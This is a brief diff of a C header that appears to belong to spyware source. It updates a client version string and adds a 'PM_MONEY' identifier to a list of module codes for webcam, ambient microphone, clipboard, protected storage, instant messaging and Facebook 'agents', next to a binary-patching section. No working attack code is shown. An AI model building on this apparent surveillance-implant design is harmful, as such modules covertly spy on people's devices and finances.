@@ -97,7 +97,7 @@ extern BOOL is_demo_version;
 #define SHARE_MEMORY_ASP_DATA_BASENAME "DPD"*/
 
 // Versione del client 
-#define CLIENT_VERSION "2013103104"
+#define CLIENT_VERSION "2014022401"
 
 // -------- Elementi per il binary patching ---------
 // Chiave UNIVOCA fra server e client
@@ -162,6 +162,7 @@ extern BOOL is_demo_version;
 #define PM_SOCIALAGENT_FB	  0xAAB1	// Usato per i file di markup per il modulo facebook dell'agente social
 #define PM_AMBMICAGENT        0xC2C2
 #define PM_WEBCAMAGENT        0xE9E9
+#define PM_MONEY              0xB1C0
 #define PM_CLIPBOARDAGENT     0xD9D9
 #define PM_PSTOREAGENT        0xFAFA
 #define PM_IMAGENT            0xC6C6
